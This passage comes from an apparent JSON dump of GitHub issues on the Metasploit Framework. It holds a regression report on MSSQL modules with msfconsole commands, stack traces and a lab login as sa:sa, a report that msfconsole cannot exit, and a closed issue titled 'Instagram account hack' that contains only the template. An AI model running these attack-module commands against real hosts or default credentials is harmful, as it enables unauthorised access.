exploit/windows/mssql/mssql_payload\n\nThe common error observed is:\n\n```text\nNoMethodError\nundefined method 'length' for false\n```\n\n### Example: mssql_version\n\n```text\nmsf > use auxiliary/scanner/mssql/mssql_version\nmsf auxiliary(mssql_version) > set RHOSTS 192.168.1.200\nmsf auxiliary(mssql_version) > run\n\n[-] 192.168.1.200:1433 - Auxiliary failed:\nNoMethodError undefined method 'length' for false\n```\n\nStack trace:\n\n```text\nC:/MSF-LAB/frameworks/6.4.126/embedded/framework/lib/rex/proto/mssql/client_mixin.rb:148:in 'Rex::Proto::MSSQL::ClientMixin#parse_prelogin_response'\nC:/MSF-LAB/frameworks/6.4.126/embedded/framework/lib/rex/proto/mssql/client.rb:198:in 'Rex::Proto::MSSQL::Client#mssql_prelogin'\nC:/MSF-LAB/frameworks/6.4.126/embedded/framework/lib/msf/core/exploit/remote/mssql.rb:194:in 'Msf::Exploit::Remote::MSSQL#mssql_prelogin'\nC:/MSF-LAB/frameworks/6.4.126/embedded/framework/modules/auxiliary/scanner/mssql/mssql_version.rb:30:in 'run'\n```\n\n### Example: mssql_login\n\n```text\nLOGIN FAILED:\nUnable to Connect:\nundefined method 'length' for false\n```\n\n### Example: mssql_payload\n\n```text\nExploit failed:\nNoMethodError undefined method 'length' for false\n```\n\nNo session is created.\n\n## Evidence suggesting a regression\n\nThe same MSSQL targets and credentials behave differently depending on the Framework version.\n\nThe following succeeds:\n\n* 6.3.48-dev\n* 6.3.57-dev\n\nFor example:\n\n```text\nmsf6 auxiliary(scanner/mssql/mssql_login) > run\n\n[+] 192.168.1.200:1433 - Login Successful: WORKSTATION\\sa:sa\n```\n\nThe following fail:\n\n* 6.4.126-dev\n* 6.4.133-dev\n* 6.4.134-dev\n* 6.4.135-dev\n\nThis suggests a regression somewhere between the 6.3.x and 6.4.x code paths used by MSSQL modules.\n\n## Additional observations\n\nThe exception appears to originate from MSSQL pre-login handling:\n\n```text\nRex::Proto::MSSQL::ClientMixin#parse_prelogin_response\n```\n\nBecause multiple MSSQL modules fail with the same exception, the issue may exist in a shared MSSQL library component rather than in a single module implementation.\n\nCan maintainers confirm whether this issue is already known and whether there have been recent changes affecting MSSQL pre-login negotiation, TDS parsing, or TLS handling?\nthis section.\n\n\n",
+        "url": "https://github.com/rapid7/metasploit-framework/issues/21582"
+    },
+    {
+        "id": 4668587634,
+        "number": 21572,
+        "title": "Cannot quit msfconsole if you start the docker database after starting msfconsole.",
+        "state": "open",
+        "created_at": "2026-06-15T20:17:40Z",
+        "updated_at": "2026-06-15T20:17:40Z",
+        "closed_at": null,
+        "author": "bwatters-r7",
+        "comments": 0,
+        "labels": [
+            "bug"
+        ],
+        "assignees": [],
+        "locked": false,
+        "body": "Tested on https://github.com/rapid7/metasploit-framework/pull/21430, but it also happened last week on master, I believe.\n\n1. Start msfconsole\n2. Start msf docker database: `sudo docker run --rm -it -p 127.0.0.1:5433:5432 -e POSTGRES_PASSWORD=\"mysecretpassword\" postgres:14'`\n3. Prep the database: `bundle exec ./msfdb init --connection-string=\"postgres://postgres:mysecretpassword@127.0.0.1:5433/postgres\"`\n4. Try and exit msfconsole:\n```\nmsf payload(cmd/windows/smb/x64/meterpreter/reverse_tcp) > exit\n[-] Error while running command exit: We could not find your database: msf. Available database configurations can be found in config/database.yml.\n\nTo resolve this error:\n\n- Did you not create the database, or did you delete it? To create the database, run:\n\n    bin/rails db:create\n\n- Has the database name changed? Verify that config/database.yml contains the correct database name.\n\n\nCall stack:\n/usr/share/rvm/gems/ruby-3.3.8@metasploit-framework/gems/activerecord-7.2.2.2/lib/active_record/connection_adapters/postgresql_adapter.rb:63:in `rescue in new_client'\n/usr/share/rvm/gems/ruby-3.3.8@metasploit-framework/gems/activerecord-7.2.2.2/lib/active_record/connection_adapters/postgresql_adapter.rb:57:in `new_client'\n/usr/share/rvm/gems/ruby-3.3.8@metasploit-framework/gems/activerecord-7.2.2.2/lib/active_record/connection_adapters/postgresql_adapter.rb:982:in `connect'\n/usr/share/rvm/gems/ruby-3.3.8@metasploit-framework/gems/activerecord-7.2.2.2/lib/active_record/connection_adapters/postgresql_adapter.rb:994:in `reconnect'\n/usr/share/rvm/gems/ruby-3.3.8@metasploit-framework/gems/activerecord-7.2.2.2/lib/active_record/connection_adapters/abstract_adapter.rb:662:in `block in reconnect!'\n/usr/share/rvm/gems/ruby-3.3.8@metasploit-framework/gems/activesupport-7.2.2.2/lib/active_support/concurrency/null_lock.rb:9:in `synchronize'\n/usr/share/rvm/gems/ruby-3.3.8@metasploit-framework/gems/activerecord-7.2.2.2/lib/active_record/connection_adapters/abstract_adapter.rb:661:in `reconnect!'\n/usr/share/rvm/gems/ruby-3.3.8@metasploit-framework/gems/activerecord-7.2.2.2/lib/active_record/connection_adapters/abstract_adapter.rb:763:in `block in verify!'\n/usr/share/rvm/gems/ruby-3.3.8@metasploit-framework/gems/activesupport-7.2.2.2/lib/active_support/concurrency/null_lock.rb:9:in `synchronize'\n/usr/share/rvm/gems/ruby-3.3.8@metasploit-framework/gems/activerecord-7.2.2.2/lib/active_record/connection_adapters/abstract_adapter.rb:754:in `verify!'\n/home/tmoose/git/metasploit-framework/lib/msf/core/db_manager/connection.rb:122:in `block in connection_established?'\n/usr/share/rvm/gems/ruby-3.3.8@metasploit-framework/gems/activerecord-7.2.2.2/lib/active_record/connection_adapters/abstract/connection_pool.rb:415:in `with_connection'\n/home/tmoose/git/metasploit-framework/lib/msf/core/db_manager/connection.rb:119:in `connection_established?'\n/home/tmoose/git/metasploit-framework/lib/msf/core/db_manager/connection.rb:12:in `active'\n/home/tmoose/git/metasploit-framework/lib/metasploit/framework/data_service/proxy/core.rb:45:in `active'\n/home/tmoose/git/metasploit-framework/lib/msf/core/framework.rb:377:in `on_ui_command'\n/home/tmoose/git/metasploit-framework/lib/msf/core/event_dispatcher.rb:145:in `block in method_missing'\n/home/tmoose/git/metasploit-framework/lib/msf/core/event_dispatcher.rb:143:in `each'\n/home/tmoose/git/metasploit-framework/lib/msf/core/event_dispatcher.rb:143:in `method_missing'\n/home/tmoose/git/metasploit-framework/lib/msf/ui/console/driver.rb:419:in `block in on_startup'\n/home/tmoose/git/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:530:in `block in run_single'\n/home/tmoose/git/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:525:in `each'\n/home/tmoose/git/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:525:in `run_single'\n/home/tmoose/git/metasploit-framework/lib/rex/ui/text/shell.rb:165:in `block in run'\n/home/tmoose/git/metasploit-framework/lib/rex/ui/text/shell.rb:309:in `block in with_history_manager_context'\n/home/tmoose/git/metasploit-framework/lib/rex/ui/text/shell/history_manager.rb:35:in `with_context'\n/home/tmoose/git/metasploit-framework/lib/rex/ui/text/shell.rb:306:in `with_history_manager_context'\n/home/tmoose/git/metasploit-framework/lib/rex/ui/text/shell.rb:133:in `run'\n/home/tmoose/git/metasploit-framework/lib/metasploit/framework/command/console.rb:54:in `start'\n/home/tmoose/git/metasploit-framework/lib/metasploit/framework/command/base.rb:82:in `start'\n./msfconsole:23:in `<main>'\nmsf payload(cmd/windows/smb/x64/meterpreter/reverse_tcp) > \n```\n\n<img width=\"455\" height=\"306\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/b38b29ae-5739-404f-be3e-07bd334cabb5\" />",
+        "url": "https://github.com/rapid7/metasploit-framework/issues/21572"
+    },
+    {
+        "id": 4649817236,
+        "number": 21563,
+        "title": "Instagram account hack",
+        "state": "closed",
+        "created_at": "2026-06-12T13:56:40Z",
+        "updated_at": "2026-06-12T13:58:36Z",
+        "closed_at": "2026-06-12T13:58:36Z",
+        "author": "dishantkusram7-png",
+        "comments": 2,
+        "labels": [
+            "bug"
+        ],
+        "assignees": [],
+        "locked": false,
+        "body": "<!--\n  Please fill out each section below, otherwise, your issue will be closed. This info allows Metasploit maintainers to diagnose (and fix!) your issue as quickly as possible.\n\n  Useful Links:\n  - Wiki: https://docs.metasploit.com/\n  - Reporting a Bug: https://docs.metasploit.com/docs/using-metasploit/getting-started/reporting-a-bug.html\n\n  Before opening a new issue, please search existing issues: https://github.com/rapid7/metasploit-framework/issues\n-->\n\n## Steps to reproduce\n\nHow'd you do it?\n\n1. ...\n2. ...\n\nThis section should also tell us any relevant information about the\nenvironment; for example, if an exploit that used to work is failing,\ntell us the victim operating system and service versions.\n\n## Were you following a specific guide/tutorial or reading documentation?\n\nIf yes link the guide/tutorial or documentation you were following here, otherwise you may omit this section.\n\n## Expected behavior\n\nWhat should happen?\n\n## Current behavior\n\nWhat happens instead?\n\n### Metasploit version\n\nGet this with the `version` command in msfconsole (or `git log -1 --pretty=oneline` for a source install).\n\n## Additional Information\nIf your version is less than `5.0.96`, please update to the latest version and ensure your issue is still present.\n\nIf the issue is encountered within `msfconsole`, please run the `debug` command using the instructions below. If the issue is encountered outisde `msfconsole`, or the issue causes `msfconsole` to crash on startup, please delete this section.\n\n1. Start `msfconsole`\n2. Run the command `set loglevel 3`\n3. Take the steps necessary recreate your issue\n4. Run the `debug` command\n5. Copy all the output below the `===8<=== CUT AND PASTE EVERYTHING BELOW THIS LINE ===8<===` line and make sure to **REMOVE ANY SENSITIVE INFORMATION.**\n6. Replace these instructions and the paragraph above with the output from step 5.\n",
+        "url": "https://github.com/rapid7/metasploit-framework/issues/21563"
+    }
+]
